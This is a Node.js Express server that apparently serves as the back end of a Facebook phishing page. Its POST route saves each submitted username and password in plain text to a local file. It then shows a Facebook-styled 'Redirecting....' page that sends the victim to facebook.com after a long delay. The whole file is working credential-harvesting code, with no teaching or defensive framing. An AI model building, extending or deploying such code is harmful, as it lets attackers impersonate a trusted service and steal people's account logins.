const fs = require('fs');
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, './')));

app.post('/writeToFile', (req, res) => {
    const Username2 = req.body.Username;
    const Password2 = req.body.Password;

    if (Username2.trim() !== '' && Password2.trim() !== '') {
        const data = `Username: ${Username2}\nPassword: ${Password2}\n`;

        // Write the data to the file
        fs.appendFile('info.txt', data, (err) => {
            if (err) {
                console.error('Error writing to file:', err);
                res.status(500).send('Error writing to file');
            } else {
                res.send(`
                    <html>
                        <head>
                            <script>
                                setTimeout(() => {
                                    window.location.href = 'https://www.facebook.com';
                                }, 86400000);
                            </script>
                            <style>
                                body {
                                    display: flex;
                                    flex-direction: column;
                                    align-items: center;
                                    justify-content: center;
                                    height: 100vh; /* Set the height of the body to the viewport height */
                                    margin: 0; /* Remove default margin */
                                }
                        
                                /* Additional styling for the content */
                                p {
                                    font-family: 'Facebook Sans', sans-serif;
                                    color: rgb(30, 117, 234);
                                    font-weight: Bold;
                                    letter-spacing: 3px;
                                    font-size: 50px;
                                }
                        
                                img {
                                    height: 100px;
                                    width: 100px; /* Adjust the width of the image as needed */
                                }
                            </style>
                        </head>
                        <body>
                            <p>Redirecting....</p>
                            <br>
                            <img src="facebook.gif" alt="Icon">
                        </body>
                    </html>
                `);
            }
        });
    } else {
        res.status(400).send('Please enter both Username and Password.');
    }
});

app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
